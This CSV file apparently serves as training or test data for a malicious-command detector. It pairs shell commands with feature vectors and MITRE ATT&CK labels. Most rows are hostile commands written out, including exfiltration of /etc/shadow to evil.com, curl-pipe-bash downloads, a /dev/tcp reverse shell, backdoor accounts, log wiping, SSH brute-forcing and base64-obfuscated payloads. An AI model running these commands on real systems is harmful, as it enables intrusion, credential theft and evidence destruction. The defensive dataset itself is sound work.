"nohup python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())"" &","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
unzip archive.zip -d /opt/,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
time echo 'R2V0LUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwIEFkbWluaXN0cmF0b3JzIDsgZWNobyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
find / -writable -type d 2>/dev/null && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 1]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
cat /etc/passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
"sudo python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
lsb_release  -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
"bash -c ""shred -u /var/log/auth.log""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1070_Indicator_Removal'],synthetic
systemctl restart nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
whoami /all,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'Y3VybCAtcyBodHRwOi8vYzIuYXR0YWNrZXIuY29tL2JlYWNvbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
medusa  -h  10.0.0.1  -u  root  -P  /tmp/passwords.txt  -M  ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
nohup scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/ &,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
rm -rf /tmp/* /var/tmp/*,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
lsb_release -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
"bash -c ""cat /etc/passwd | awk -F: '$3 >= 1000'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1087_Account_Discovery'],synthetic
sudo nmap --script=vuln 10.0.0.1 | > /dev/null 2>&1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.2, 0.32, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find /home -name '.env' 2>/dev/null ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo 'aHlkcmEgLWwgYWRtaW4gLVAgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQgc3NoOi8vMTAuMC4wLjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
"bash -c ""$env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA'))""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time Get-LocalGroupMember -Group Administrators ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup adduser --shell /bin/bash --disabled-password backdoor &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1136_Create_Account'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
"bash -c ""python3 exploit.py --target localhost""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
sudo arp -a,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
nohup curl -sL http://evil.com/shell.sh -o /tmp/shell.sh | > /dev/null 2>&1 &,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 | history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup wget -q https://example.com/file.tar.gz &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
echo 'ZmluZCAvIC1wZXJtIC00MDAwIC10eXBlIGYgMj4vZGV2L251bGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
ss -anp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
sudo uname -a,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
cat /proc/version ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
tftp  -i  10.0.0.99  GET  payload.exe  C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
time pip install requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
adduser --shell /bin/bash --disabled-password backdoor && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bHNjcHU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"time nmap -sV -p 22,80,443 10.0.0.0/24 | > /dev/null 2>&1","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.2, 0.4, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ln -s /tmp/backdoor.sh /etc/cron.d/system-update ; echo done,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
time echo 'd2dldCAtLXBvc3QtZmlsZT0vZXRjL3Bhc3N3ZCBodHRwOi8vYXR0YWNrZXIuY29tL3JlY2VpdmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
python3 -c 'print(1+1)',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'Z2NjIGV4cGxvaXQuYyAtbyBleHBsb2l0ICYmIC4vZXhwbG9pdA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
ssh -L 8080:internal:80 user@jump.host && > /dev/null 2>&1,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wmic useraccount list,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAtdiBub2xvZ2luIHwgZ3JlcCAtdiBmYWxzZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nohup curl -X POST http://evil.com/collect -d @/etc/shadow &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
sudo New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
last -n 10,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
"python3 -c ""import subprocess; subprocess.run(['cat','/etc/shadow'])""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
nohup echo 'Zm9yIHAgaW4gJChjYXQgcGFzc3dvcmRzLnR4dCk7IGRvIHNzaHBhc3MgLXAgJHAgc3NoIHJvb3RAMTAuMC4wLjEgaWQ7IGRvbmU=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
shred -u /var/log/auth.log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1070_Indicator_Removal'],synthetic
perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
id -Gn | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.2, 0.24, 1, 1]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
echo 'Y2F0IC9wcm9jL3ZlcnNpb24=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe | history -c,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup find / -name 'id_rsa' 2>/dev/null &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
for  i  in  $(seq  1  254);  do  ping  -c1  -W1  192.168.0.$i  &>/dev/null  &&  echo  192.168.0.$i;  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
sudo find / -writable -type d 2>/dev/null ; > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bm1hcCAtc24gMTkyLjE2OC4xLjAvMjQgOyBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ip neigh show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
sudo echo 'Y2F0IC90bXAvZW5jb2RlZCB8IHh4ZCAtciAtcCB8IGJhc2g=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'ZmluZCAvaG9tZSAtbmFtZSAnLmVudicgMj4vZGV2L251bGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
systemctl enable --now malicious.service | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 1]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time net localgroup administrators | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Z2V0ZW50IGdyb3VwIHN1ZG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nohup ls -la /home/user &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
shred  -u  /var/log/auth.log  |  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
"bash -c ""echo 'cHl0aG9uMyBleHBsb2l0LnB5IC0tdGFyZ2V0IGxvY2FsaG9zdCA7IGVjaG8gZG9uZQ==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
find / -writable -type d 2>/dev/null ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo  '@reboot  /tmp/.xmr/xmrig  -o  pool.minexmr.com'  |  crontab  -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
grep -r 'error' /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
"bash -c ""perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/' | echo done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.2, 0.44, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
mkdir -p /opt/myapp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
cat ~/.ssh/id_rsa,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
wmic useraccount list ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ps aux | grep nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]",['BENIGN'],synthetic
getent group sudo && echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
smbclient //10.0.0.5/C$ -U Administrator | sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
useradd -m -s /bin/bash hacker | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 1]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
find / -perm -4000 -type f 2>/dev/null && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
sudo sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1 && echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
history -c && history -w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)' | sleep 1","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cHl0aG9uMyBleHBsb2l0LnB5IC0tdGFyZ2V0IGxvY2FsaG9zdA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
gcc  exploit.c  -o  exploit  &&  ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
